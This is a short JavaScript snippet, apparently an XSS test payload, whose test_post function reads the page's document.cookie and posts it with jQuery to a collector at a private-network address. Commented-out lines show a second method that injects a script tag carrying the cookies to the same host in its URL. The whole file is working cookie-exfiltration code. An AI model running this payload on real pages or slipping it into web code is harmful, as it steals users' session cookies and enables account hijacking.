function test_post() {
    var cookie_test = document.cookie
    $.post('http://192.168.1.110:7000/',cookie_test);
    // var hm = document.createElement("script");
    // hm.src = "//192.168.1.110:7000/?" + cookie_test;
    // var s = document.getElementsByTagName("script")[0];
    // s.parentNode.insertBefore(hm, s);
}